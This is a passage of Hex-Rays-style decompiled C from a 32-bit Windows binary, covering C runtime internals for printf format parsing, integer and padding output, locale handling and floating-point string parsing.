  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_96(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_4644BC((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 463F9E: using guessed type _DWORD __stdcall unknown_libname_96(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 463B17: using guessed type char var_45C[64];
// 463B17: using guessed type char var_41C[1040];

//----- (00464398) --------------------------------------------------------
int __thiscall sub_464398(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_108(this + 1096) )
    return -1;
  if ( !*(_DWORD *)(this + 16) )
  {
LABEL_3:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  while ( ++*(_DWORD *)(this + 1104) != 2 )
  {
    *(_DWORD *)(this + 56) = 0;
    *(_DWORD *)(this + 28) = 0;
    while ( 1 )
    {
      v5 = **(_BYTE **)(this + 16);
      *(_BYTE *)(this + 49) = v5;
      if ( !v5 )
        break;
      ++*(_DWORD *)(this + 16);
      if ( *(int *)(this + 24) < 0 )
        goto LABEL_20;
      v3 = sub_464174(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
      *(_DWORD *)(this + 28) = v3;
      if ( v3 == 8 )
        goto LABEL_3;
      switch ( v3 )
      {
        case 0:
          v4 = sub_46462C((char *)this);
          break;
        case 1:
          *(_DWORD *)(this + 40) = -1;
          *(_DWORD *)(this + 36) = 0;
          *(_BYTE *)(this + 48) = 0;
          *(_DWORD *)(this + 32) = 0;
          *(_DWORD *)(this + 44) = 0;
          *(_BYTE *)(this + 60) = 0;
          continue;
        case 2:
          v4 = unknown_libname_100(this);
          break;
        case 3:
          v4 = sub_464EA6(this);
          break;
        case 4:
          *(_DWORD *)(this + 40) = 0;
          continue;
        case 5:
          v4 = sub_464780(this);
          break;
        case 6:
          v4 = sub_4648F4((_BYTE *)this);
          break;
        case 7:
          v4 = sub_464C74(this);
          break;
        default:
          return -1;
      }
      if ( !v4 )
        return -1;
    }
    ++*(_DWORD *)(this + 16);
LABEL_20:
    if ( !(unsigned __int8)unknown_libname_109(this) )
      return -1;
  }
  return *(_DWORD *)(this + 24);
}
// 464174: using guessed type _DWORD __stdcall sub_464174(char, _DWORD);
// 4645D0: using guessed type int __thiscall unknown_libname_100(_DWORD);
// 464780: using guessed type int __thiscall sub_464780(_DWORD);
// 4653EC: using guessed type int __thiscall unknown_libname_108(_DWORD);
// 465407: using guessed type int __thiscall unknown_libname_109(_DWORD);

//----- (004644BC) --------------------------------------------------------
int __thiscall sub_4644BC(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_108(this + 1096) )
    return -1;
  if ( !*(_DWORD *)(this + 16) )
  {
LABEL_3:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
LABEL_20:
  while ( ++*(_DWORD *)(this + 1104) != 2 )
  {
    *(_DWORD *)(this + 56) = 0;
    *(_DWORD *)(this + 28) = 0;
    while ( 1 )
    {
      v5 = **(_BYTE **)(this + 16);
      *(_BYTE *)(this + 49) = v5;
      if ( !v5 )
        break;
      ++*(_DWORD *)(this + 16);
      if ( *(int *)(this + 24) < 0 )
        goto LABEL_20;
      v3 = unknown_libname_98(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
      *(_DWORD *)(this + 28) = v3;
      if ( v3 == 8 )
        goto LABEL_3;
      switch ( v3 )
      {
        case 0:
          v4 = sub_46462C((char *)this);
          break;
        case 1:
          *(_DWORD *)(this + 40) = -1;
          *(_DWORD *)(this + 36) = 0;
          *(_BYTE *)(this + 48) = 0;
          *(_DWORD *)(this + 32) = 0;
          *(_DWORD *)(this + 44) = 0;
          *(_BYTE *)(this + 60) = 0;
          continue;
        case 2:
          v4 = unknown_libname_100(this);
          break;
        case 3:
          v4 = sub_464EA6(this);
          break;
        case 4:
          *(_DWORD *)(this + 40) = 0;
          continue;
        case 5:
          v4 = sub_464780(this);
          break;
        case 6:
          v4 = sub_4648F4((_BYTE *)this);
          break;
        case 7:
          v4 = sub_464C74(this);
          break;
        default:
          return -1;
      }
      if ( !v4 )
        return -1;
    }
    ++*(_DWORD *)(this + 16);
  }
  return *(_DWORD *)(this + 24);
}
// 464137: using guessed type _DWORD __stdcall unknown_libname_98(char, _DWORD);
// 4645D0: using guessed type int __thiscall unknown_libname_100(_DWORD);
// 464780: using guessed type int __thiscall sub_464780(_DWORD);
// 4653EC: using guessed type int __thiscall unknown_libname_108(_DWORD);

//----- (0046460D) --------------------------------------------------------
char __thiscall sub_46460D(void *this)
{
  if ( sub_46464B((int)this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (0046462C) --------------------------------------------------------
char __thiscall sub_46462C(char *this)
{
  if ( sub_464685(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (0046464B) --------------------------------------------------------
char __thiscall sub_46464B(int this)
{
  char result; // al

  result = unknown_libname_101(0);
  if ( result )
  {
    if ( (unsigned __int8)__crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(*(_BYTE *)(this + 49)) )
      ++*(_DWORD *)(this + 24);
    else
      *(_DWORD *)(this + 24) = -1;
    return 1;
  }
  return result;
}
// 4646AF: using guessed type _DWORD __stdcall unknown_libname_101(_DWORD);
// 4654F2: using guessed type _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char);

//----- (00464685) --------------------------------------------------------
char __thiscall sub_464685(char *this)
{
  char result; // al

  result = unknown_libname_102(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 46471C: using guessed type _DWORD __stdcall unknown_libname_102(_DWORD);
// 4654B0: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (004647A6) --------------------------------------------------------
char __thiscall sub_4647A6(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  int v4; // eax
  char *v5; // edx
  char v6; // al
  _BYTE *v7; // eax
  int v8; // [esp-4h] [ebp-4h]

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_464A42((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *((_DWORD *)this + 11) )
    goto LABEL_7;
  if ( v1 > 106 )
  {
    if ( v1 != 108 )
    {
      switch ( v1 )
      {
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
      return 1;
    }
    v7 = (_BYTE *)*((_DWORD *)this + 4);
    if ( *v7 == 108 )
    {
      *((_DWORD *)this + 4) = v7 + 1;
      v8 = 4;
    }
    else
    {
      v8 = 3;
    }
    goto LABEL_44;
  }
  switch ( v1 )
  {
    case 'j':
      *((_DWORD *)this + 11) = 5;
      return 1;
    case 'I':
      v5 = (char *)*((_DWORD *)this + 4);
      v6 = *v5;
      if ( *v5 == 51 && v5[1] == 50 )
      {
        *((_DWORD *)this + 11) = 10;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 54 && v5[1] == 52 )
      {
        *((_DWORD *)this + 11) = 11;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 100 || v6 == 105 || v6 == 111 || v6 == 117 || v6 == 120 || v6 == 88 )
      {
        *((_DWORD *)this + 11) = 9;
      }
      return 1;
    case 'L':
      *((_DWORD *)this + 11) = 8;
      return 1;
    case 'T':
      *((_DWORD *)this + 11) = 13;
      return 1;
    case 'h':
      v3 = (_BYTE *)*((_DWORD *)this + 4);
      if ( *v3 == 104 )
      {
        *((_DWORD *)this + 4) = v3 + 1;
        v4 = 1;
LABEL_45:
        *((_DWORD *)this + 11) = v4;
        return 1;
      }
      v8 = 2;
LABEL_44:
      v4 = v8;
      goto LABEL_45;
  }
  return 1;
}

//----- (004648F4) --------------------------------------------------------
char __thiscall sub_4648F4(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  int v4; // eax
  char *v5; // edx
  char v6; // al
  _BYTE *v7; // eax
  int v8; // [esp-4h] [ebp-4h]

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_464C74((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *((_DWORD *)this + 11) )
    goto LABEL_7;
  if ( v1 > 106 )
  {
    if ( v1 != 108 )
    {
      switch ( v1 )
      {
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
      return 1;
    }
    v7 = (_BYTE *)*((_DWORD *)this + 4);
    if ( *v7 == 108 )
    {
      *((_DWORD *)this + 4) = v7 + 1;
      v8 = 4;
    }
    else
    {
      v8 = 3;
    }
    goto LABEL_44;
  }
  switch ( v1 )
  {
    case 'j':
      *((_DWORD *)this + 11) = 5;
      return 1;
    case 'I':
      v5 = (char *)*((_DWORD *)this + 4);
      v6 = *v5;
      if ( *v5 == 51 && v5[1] == 50 )
      {
        *((_DWORD *)this + 11) = 10;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 54 && v5[1] == 52 )
      {
        *((_DWORD *)this + 11) = 11;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 100 || v6 == 105 || v6 == 111 || v6 == 117 || v6 == 120 || v6 == 88 )
      {
        *((_DWORD *)this + 11) = 9;
      }
      return 1;
    case 'L':
      *((_DWORD *)this + 11) = 8;
      return 1;
    case 'T':
      *((_DWORD *)this + 11) = 13;
      return 1;
    case 'h':
      v3 = (_BYTE *)*((_DWORD *)this + 4);
      if ( *v3 == 104 )
      {
        *((_DWORD *)this + 4) = v3 + 1;
        v4 = 1;
LABEL_45:
        *((_DWORD *)this + 11) = v4;
        return 1;
      }
      v8 = 2;
LABEL_44:
      v4 = v8;
      goto LABEL_45;
  }
  return 1;
}

//----- (00464A42) --------------------------------------------------------
char __thiscall sub_464A42(int this)
{
  int v2; // eax
  char v3; // al
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // ebx
  char v11; // dl
  bool v12; // bl
  bool v13; // al
  char v14; // al
  int v15; // edi
  char v16; // [esp-4h] [ebp-14h]
  int v17; // [esp+8h] [ebp-8h]
  __int16 v18; // [esp+Ch] [ebp-4h] BYREF
  char v19; // [esp+Eh] [ebp-2h]

  v2 = *(char *)(this + 49);
  if ( v2 <= 100 )
  {
    if ( v2 != 100 )
    {
      if ( v2 > 88 )
      {
        v5 = v2 - 90;
        if ( !v5 )
        {
          v3 = unknown_libname_103(this);
          goto LABEL_11;
        }
        v6 = v5 - 7;
        if ( !v6 )
          goto LABEL_31;
        if ( v6 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v2 != 88 )
      {
        if ( v2 != 65 )
        {
          if ( v2 != 67 )
          {
            if ( v2 <= 68 )
              return 0;
            if ( v2 > 71 )
            {
              if ( v2 == 83 )
              {
LABEL_10:
                v3 = unknown_libname_106(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v3 = sub_4650CE(0);
          goto LABEL_11;
        }
LABEL_31:
        v3 = unknown_libname_104(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v3 = sub_46515E(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v2 > 112 )
  {
    v7 = v2 - 115;
    if ( !v7 )
      goto LABEL_10;
    v8 = v7 - 2;
    if ( v8 )
    {
      if ( v8 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v2 == 112 )
  {
    v3 = sub_465342((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v2 <= 103 )
    goto LABEL_31;
  switch ( v2 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v3 = sub_46515E(this, 10, 0);
      break;
    case 'n':
      v3 = unknown_libname_105(this);
      break;
    case 'o':
      v3 = sub_465323((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(this + 48) )
  {
    v9 = 0;
    v18 = 0;
    v19 = 0;
    v10 = *(_DWORD *)(this + 32);
    v17 = 0;
    if ( (v10 & 0x10) != 0 )
    {
      if ( (v10 & 0x40) != 0 )
      {
        LOBYTE(v18) = 45;
      }
      else
      {
        if ( (v10 & 1) == 0 )
        {
          if ( (v10 & 2) != 0 )
          {
            LOBYTE(v18) = 32;
            v9 = 1;
            v17 = 1;
          }
          goto LABEL_46;
        }
        LOBYTE(v18) = 43;
      }
      v9 = 1;
      v17 = 1;
    }
LABEL_46:
    v11 = *(_BYTE *)(this + 49);
    v12 = (v11 == 120 || v11 == 88) && (v10 & 0x20) != 0;
    v13 = v11 == 97 || v11 == 65;
    if ( v12 || v13 )
    {
      *((_BYTE *)&v18 + v9) = 48;
      if ( v11 == 88 || v11 == 65 )
        v14 = 88;
      else
        v14 = 120;
      *((_BYTE *)&v18 + v9 + 1) = v14;
      v9 += 2;
      v17 = v9;
    }
    v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v9;
    if ( (*(_BYTE *)(this + 32) & 0xC) == 0 )
    {
      sub_463EF2(this + 1096, 32, v15, this + 24);
      v9 = v17;
    }
    __crt_stdio_output::stream_output_adapter<char>::write_string(&v18, v9, this + 24, this + 12);
    if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
      sub_463EF2(this + 1096, 48, v15, this + 24);
    unknown_libname_110(0);
    if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
      sub_463EF2(this + 1096, 32, v15, this + 24);
  }
  return 1;
}
// 463EF2: using guessed type _DWORD __cdecl sub_463EF2(_DWORD, _DWORD, _DWORD, _DWORD);
// 464F25: using guessed type int __thiscall unknown_libname_103(_DWORD);
// 464F7F: using guessed type int __thiscall unknown_libname_104(_DWORD);
// 4650CE: using guessed type _DWORD __stdcall sub_4650CE(_DWORD);
// 4652AF: using guessed type int __thiscall unknown_libname_105(_DWORD);
// 46535A: using guessed type int __thiscall unknown_libname_106(_DWORD);
// 465528: using guessed type _DWORD __stdcall unknown_libname_110(_DWORD);
// 465676: using guessed type _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00464C74) --------------------------------------------------------
char __thiscall sub_464C74(int this)
{
  int v2; // eax
  char v3; // al
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // ebx
  char v11; // dl
  bool v12; // bl
  bool v13; // al
  char v14; // al
  int v15; // edi
  char v16; // [esp-4h] [ebp-14h]
  int v17; // [esp+8h] [ebp-8h]
  __int16 Src; // [esp+Ch] [ebp-4h] BYREF
  char v19; // [esp+Eh] [ebp-2h]

  v2 = *(char *)(this + 49);
  if ( v2 <= 100 )
  {
    if ( v2 != 100 )
    {
      if ( v2 > 88 )
      {
        v5 = v2 - 90;
        if ( !v5 )
        {
          v3 = unknown_libname_103(this);
          goto LABEL_11;
        }
        v6 = v5 - 7;
        if ( !v6 )
          goto LABEL_31;
        if ( v6 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v2 != 88 )
      {
        if ( v2 != 65 )
        {
          if ( v2 != 67 )
          {
            if ( v2 <= 68 )
              return 0;
            if ( v2 > 71 )
            {
              if ( v2 == 83 )
              {
LABEL_10:
                v3 = unknown_libname_106(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v3 = sub_4650CE(0);
          goto LABEL_11;
        }
LABEL_31:
        v3 = unknown_libname_104(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v3 = sub_46515E(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v2 > 112 )
  {
    v7 = v2 - 115;
    if ( !v7 )
      goto LABEL_10;
    v8 = v7 - 2;
    if ( v8 )
    {
      if ( v8 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v2 == 112 )
  {
    v3 = sub_465342((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v2 <= 103 )
    goto LABEL_31;
  switch ( v2 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v3 = sub_46515E(this, 10, 0);
      break;
    case 'n':
      v3 = unknown_libname_105(this);
      break;
    case 'o':
      v3 = sub_465323((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(this + 48) )
  {
    v9 = 0;
    Src = 0;
    v19 = 0;
    v10 = *(_DWORD *)(this + 32);
    v17 = 0;
    if ( (v10 & 0x10) != 0 )
    {
      if ( (v10 & 0x40) != 0 )
      {
        LOBYTE(Src) = 45;
      }
      else
      {
        if ( (v10 & 1) == 0 )
        {
          if ( (v10 & 2) != 0 )
          {
            LOBYTE(Src) = 32;
            v9 = 1;
            v17 = 1;
          }
          goto LABEL_46;
        }
        LOBYTE(Src) = 43;
      }
      v9 = 1;
      v17 = 1;
    }
LABEL_46:
    v11 = *(_BYTE *)(this + 49);
    v12 = (v11 == 120 || v11 == 88) && (v10 & 0x20) != 0;
    v13 = v11 == 97 || v11 == 65;
    if ( v12 || v13 )
    {
      *((_BYTE *)&Src + v9) = 48;
      if ( v11 == 88 || v11 == 65 )
        v14 = 88;
      else
        v14 = 120;
      *((_BYTE *)&Src + v9 + 1) = v14;
      v9 += 2;
      v17 = v9;
    }
    v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v9;
    if ( (*(_BYTE *)(this + 32) & 0xC) == 0 )
    {
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
      v9 = v17;
    }
    unknown_libname_111(&Src, v9, this + 24, this + 12);
    if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        48,
        v15,
        this + 24);
    sub_4655CF(0);
    if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
  }
  return 1;
}
// 463F2D: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 464F25: using guessed type int __thiscall unknown_libname_103(_DWORD);
// 464F7F: using guessed type int __thiscall unknown_libname_104(_DWORD);
// 4650CE: using guessed type _DWORD __stdcall sub_4650CE(_DWORD);
// 4652AF: using guessed type int __thiscall unknown_libname_105(_DWORD);
// 46535A: using guessed type int __thiscall unknown_libname_106(_DWORD);
// 4655CF: using guessed type _DWORD __stdcall sub_4655CF(_DWORD);

//----- (00464EA6) --------------------------------------------------------
char __thiscall sub_464EA6(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 36);
  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_99(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *v1 = -v3;
  }
  return 1;
}
// 464210: using guessed type _DWORD __stdcall unknown_libname_99(_DWORD);

//----- (0046515E) --------------------------------------------------------
char __thiscall sub_46515E(int this, int a2, char a3)
{
  int v4; // eax
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  int v18; // [esp-4h] [ebp-14h]
  int v19; // [esp+Ch] [ebp-4h]

  v4 = __crt_stdio_output::to_integer_size(*(_DWORD *)(this + 44));
  v19 = v4;
  switch ( v4 )
  {
    case 1:
      v15 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v15 & 0x10) == 0;
      v16 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int8 *)(v16 - 4);
      else
        v12 = *(char *)(v16 - 4);
      goto LABEL_16;
    case 2:
      v13 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int16 *)(v14 - 4);
      else
        v12 = *(__int16 *)(v14 - 4);
LABEL_16:
      v8 = v12 >> 31;
      v7 = v12;
      goto LABEL_17;
    case 4:
      v9 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v9 & 0x10) == 0;
      v11 = *(_DWORD *)(this + 20);
      if ( v10 )
      {
        v7 = *(_DWORD *)(v11 - 4);
        v8 = 0;
        goto LABEL_17;
      }
      v12 = *(_DWORD *)(v11 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  *(_DWORD *)(this + 20) += 8;
  v6 = *(_DWORD *)(this + 20);
  v7 = *(_DWORD *)(v6 - 8);
  v8 = *(_DWORD *)(v6 - 4);
LABEL_17:
  v17 = *(_DWORD *)(this + 32);
  if ( (v17 & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    v8 = (unsigned __int64)-__SPAIR64__(v8, v7) >> 32;
    v17 |= 0x40u;
    *(_DWORD *)(this + 32) = v17;
  }
  if ( *(int *)(this + 40) >= 0 )
  {
    v18 = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 32) = v17 & 0xFFFFFFF7;
    __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(v18);
  }
  else
  {
    *(_DWORD *)(this + 40) = 1;
  }
  if ( !(v8 | v7) )
    *(_DWORD *)(this + 32) &= ~0x20u;
  *(_BYTE *)(this + 60) = 0;
  if ( v19 == 8 )
    unknown_libname_95(v7, v8, a2, a3);
  else
    unknown_libname_94(v7, a2, a3);
  if ( (*(_DWORD *)(this + 32) & 0x80) != 0 && (!*(_DWORD *)(this + 56) || **(_BYTE **)(this + 52) != 48) )
  {
    *(_BYTE *)--*(_DWORD *)(this + 52) = 48;
    ++*(_DWORD *)(this + 56);
  }
  return 1;
}
// 463D25: using guessed type _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD);
// 463DF1: using guessed type _DWORD __stdcall unknown_libname_94(_DWORD, _DWORD, char);
// 463E64: using guessed type _DWORD __stdcall unknown_libname_95(_DWORD, _DWORD, _DWORD, char);
// 464ED1: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (00465323) --------------------------------------------------------
char __thiscall sub_465323(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_46515E((int)this, 8, 0);
}

//----- (00465342) --------------------------------------------------------
char __thiscall sub_465342(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_46515E((int)this, 16, 1);
}

//----- (004657A7) --------------------------------------------------------
int __cdecl sub_4657A7(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7[5]; // [esp+0h] [ebp-38h] BYREF
  int v8[2]; // [esp+14h] [ebp-24h] BYREF
  int v9; // [esp+1Ch] [ebp-1Ch] BYREF
  int v10; // [esp+20h] [ebp-18h] BYREF
  int v11; // [esp+24h] [ebp-14h] BYREF
  int v12; // [esp+28h] [ebp-10h] BYREF
  int v13; // [esp+2Ch] [ebp-Ch] BYREF
  int v14; // [esp+30h] [ebp-8h] BYREF

  v11 = a6;
  v13 = a5;
  v8[0] = a1;
  v12 = a4;
  v14 = a3;
  v8[1] = a2;
  if ( a3 && a4 )
  {
    v10 = a3;
    v7[0] = (int)&v14;
    v7[1] = (int)&v13;
    v7[2] = (int)v8;
    v7[3] = (int)&v12;
    v7[4] = (int)&v11;
    v9 = a3;
    return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(
             &v9,
             v7,
             &v10);
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 463856: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(_DWORD, _DWORD, _DWORD);

//----- (0046582A) --------------------------------------------------------
int __cdecl sub_46582A(int a1, int a2, int *a3, int a4, int a5, int a6, struct __crt_locale_pointers *a7, int a8)
{
  return sub_4638B1(a1, a2, a3, a4, a5, a6, a7, a8);
}

//----- (00465851) --------------------------------------------------------
int __cdecl sub_465851(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  return sub_463B17(a1, a2, a3, a4, a5, a6, a7);
}

//----- (004660C4) --------------------------------------------------------
int __stdcall sub_4660C4(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = _lambda_2116bde18c9e5f34230805ea4a4660ed_::operator()(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 46611F: using guessed type int __thiscall _lambda_2116bde18c9e5f34230805ea4a4660ed_::operator()(_DWORD);
// 46640C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 466454: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (00466898) --------------------------------------------------------
double __cdecl sub_466898(int a1, _DWORD *a2, struct __crt_locale_pointers *a3)
{
  int v4; // ecx
  int v5; // eax
  int v6; // [esp-Ch] [ebp-2Ch] BYREF
  int v7; // [esp-8h] [ebp-28h]
  int *v8; // [esp-4h] [ebp-24h]
  int v9; // [esp+8h] [ebp-18h] BYREF
  __crt_locale_pointers Locale; // [esp+Ch] [ebp-14h] BYREF
  char v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h] BYREF

  if ( a2 )
    *a2 = a1;
  if ( a1 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a3);
    v8 = &v13;
    v7 = v4;
    v6 = v4;
    *(float *)&v13 = 0.0;
    unknown_libname_112(&v6, a1, a2);
    v5 = __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(
           &Locale,
           v6,
           v7,
           (int)v8);
    if ( v5 == 3 || v5 == 2 )
      *_errno() = 34;
    v12 = v13;
    if ( v11 )
      *(_DWORD *)(v9 + 848) &= ~2u;
    return *(float *)&v12;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0.0;
  }
}
// 4668D7: variable 'v4' is possibly undefined
// 466A34: using guessed type _DWORD __cdecl unknown_libname_112(_DWORD, _DWORD, _DWORD);

//----- (00466927) --------------------------------------------------------
double __cdecl sub_466927(int a1, _DWORD *a2, struct __crt_locale_pointers *a3)
{
  double result; // st7
  int v4; // ecx
  int v5; // eax
